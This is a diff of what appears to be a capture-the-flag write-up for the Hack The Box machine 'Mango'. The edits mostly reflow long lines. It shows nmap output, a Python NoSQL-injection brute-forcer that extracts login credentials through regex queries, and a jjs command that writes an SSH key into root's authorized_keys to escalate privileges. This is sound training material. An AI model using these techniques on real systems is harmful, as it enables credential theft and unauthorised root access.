@@ -20,8 +20,10 @@ w 443/tcp open ssl/ssl Apache httpd (SSL-only mode)
 |_ Supported Methods: GET HEAD POST OPTIONS
 |_http-server-header: Apache/2.4.29 (Ubuntu)
 |_http-title: Mango | Search Base
-| x ssl-cert: Subject: commonName=staging-order.mango.htb/organizationName=Mango Prv Ltd./stateOrProvinceName=None/countryName=IN
-| Issuer: commonName=staging-order.mango.htb/organizationName=Mango Prv Ltd./stateOrProvinceName=None/countryName=IN
+| x ssl-cert: Subject: commonName=staging-order.mango.htb/organizationName=
+    Mango Prv Ltd./stateOrProvinceName=None/countryName=IN
+| Issuer: commonName=staging-order.mango.htb/organizationName=
+    Mango Prv Ltd./stateOrProvinceName=None/countryName=IN
 | Public Key type: rsa
 | Public Key bits: 2048
 | Signature Algorithm: sha256WithRSAEncryption
@@ -41,17 +43,13 @@ Accessing the website on port 443 using https, we get a warning about the SSL ce
 
 Accepting the risk and continuing takes us to a web page with a search box that is reminiscent of the Google search page.
 
-!\[Graphical user interface, text, application, email
+![Home page for https://10.129.1.219/](../.gitbook/assets/mangohomepage.png)
 
-Description automatically generated\]\(../.gitbook/assets/4%20%282%29.png\)
-
-Home page for [https://10.129.1.219/](https://10.129.1.219/)
-
-The search box is not functional as the buttons are hyperlinks to the same page. Clicking on the link for Analytics takes us to a page which shows a spreadsheet with figures broken down by US states \(Figure 3-3\)
+The search box is not functional as the buttons are hyperlinks to the same page. Clicking on the link for Analytics takes us to a page which shows a spreadsheet with figures broken down by US states.
 
 ![Analytics page on Mango](../.gitbook/assets/5%20%286%29.png)
 
-After enumerating this page, there is nothing that appears obviously exploitable. If we use the URL [http://staging-order.mango.htb](http://staging-order.mango.htb) so that it accesses the site via port 80 however, we get a login page for a different virtual site \(Figure 3-4\).
+After enumerating this page, there is nothing that appears obviously exploitable. If we use the URL [http://staging-order.mango.htb](http://staging-order.mango.htb) so that it accesses the site via port 80 however, we get a login page for a different virtual site.
 
 ![Home page for virtual host site on port 80 http://staging-order.mango.htb](../.gitbook/assets/6%20%285%29.png)
 
@@ -76,7 +74,8 @@ import requests
 from cmd import Cmd
 
 def inject(data):
-  v r = requests.post("http://staging-order.mango.htb/", data=data, allow_redirects=False)
+  v r = requests.post("http://staging-order.mango.htb/", 
+                      data=data, allow_redirects=False)
   if r.status_code != 200:
     return True
 
@@ -84,7 +83,8 @@ def brute_user(user=""):
   secret = user 
   payload = ""
   while True:
-    data = {"username[$regex]":"^" + payload + "$", "password[$ne]":"rin", "login":"login"}
+    data = {"username[$regex]":"^" + payload + "$", 
+            "password[$ne]":"rin", "login":"login"}
     if inject(data):
       print("")
       break
@@ -93,7 +93,8 @@ def brute_user(user=""):
     for i in range(97,123):
       payload = secret + chr(i)
       print("\r" + payload, flush=False, end='')
-      data = {"username[$regex]":"^" + payload, "password[$ne]":"rin", "login":"login"}
+      data = {"username[$regex]":"^" + payload, "password[$ne]":"rin", 
+              "login":"login"}
 
     if inject(data):
       print("\r" + payload, flush=True, end='')
@@ -103,7 +104,8 @@ def brute_password(user=""):
   secret = ""
   payload = ""
   while True:
-    data = {"username": user, "password[$regex]": "^" + payload + "$", "login":"login"}
+    data = {"username": user, "password[$regex]": "^" + payload + "$", 
+            "login":"login"}
 
     if inject(data):
       print("")
@@ -118,7 +120,8 @@ def brute_password(user=""):
         backspace = " "
         payload = secret + chr(i)
         print("\r" + payload + backspace, flush=False, end='')
-        data = {"username": user, "password[$regex]": "^" + payload, "login":"login"}
+        data = {"username": user, "password[$regex]": "^" + payload, 
+                "login":"login"}
 
       if inject(data):
         print("\r" + payload + backspace, flush=True, end='')
@@ -126,7 +129,8 @@ def brute_password(user=""):
         break
 
 class Terminal(Cmd):
-  intro = 'Bruteforcer for http://staging-order.mango.htb/ Type help or ? to list commands.\n'
+  intro = 'Bruteforcer for http://staging-order.mango.htb/'\
+          ' Type help or ? to list commands.\n'
 
   def do_getuser(self, args):
     "Brute force username with optional starting string"
@@ -176,7 +180,15 @@ The interesting program here is jjs which will allows JavaScript to be run at th
 ```bash
 echo 'var FileWriter = Java.type("java.io.FileWriter");
 var fw=new FileWriter("/root/.ssh/authorized_keys");
-fw.write("ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQDVlOa8ynMntHui31M7v3M4xhz3wVh9+WwDbQTOlui8a/UxWEFgbGg6Tuazr+4JJ/FPUCg9ajE3z2M4Zvfp/0L7l2PmaJd0mhs6t4gA4NatuBoSN3Gx3qNDG/dW4hRrAP3umbMdCtcXJewqFtLZmvzPbsVnqgVyjLIeerFo0NYEricSlS7X8I3NGSqOcy+jTvGyppnYet0sdtui4eKVAawuGpg0Q8tCSVl4nD6DuVLjgRFGZt8qRBOa9tFgqGF65z/tZmM+3lbr84Labe/181j7+abZb1GrkSUVmDg+T9JPTPKAAO6MpREFbsg6oSBlD3Fv5wWvuePjvTM+MudJb84iJ9emJs2k33UMjgWY+izxkzwRqs0jxme4VjWxI4PwGClW1+lop4ehgoAkW5YCWskD4wzsGzp37vsnMrMihkm8fT4BH95O8TXm6UrCPLr7AY9l207OMZ4hxLw9A97snzaXESEZy/d+tVi4f5YMoJW22YmdTfPsbhphl6axtxNKyi8=");
+fw.write("ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQDVlOa8ynMntHui31M7\
+v3M4xhz3wVh9+WwDbQTOlui8a/UxWEFgbGg6Tuazr+4JJ/FPUCg9ajE3z2M4Zvfp/0L\
+7l2PmaJd0mhs6t4gA4NatuBoSN3Gx3qNDG/dW4hRrAP3umbMdCtcXJewqFtLZmvzPbsV\
+nqgVyjLIeerFo0NYEricSlS7X8I3NGSqOcy+jTvGyppnYet0sdtui4eKVAawuGpg0Q8tC\
+SVl4nD6DuVLjgRFGZt8qRBOa9tFgqGF65z/tZmM+3lbr84Labe/181j7+abZb1GrkSUVmD\
+g+T9JPTPKAAO6MpREFbsg6oSBlD3Fv5wWvuePjvTM+MudJb84iJ9emJs2k33UMjgWY+izxk\
+zwRqs0jxme4VjWxI4PwGClW1+lop4ehgoAkW5YCWskD4wzsGzp37vsnMrMihkm8fT4\
+BH95O8TXm6UrCPLr7AY9l207OMZ4hxLw9A97snzaXESEZy/d+tVi4f5YMoJW22YmdT\
+fPsbhphl6axtxNKyi8=");
 fw.close();' | jjs
 ```
 
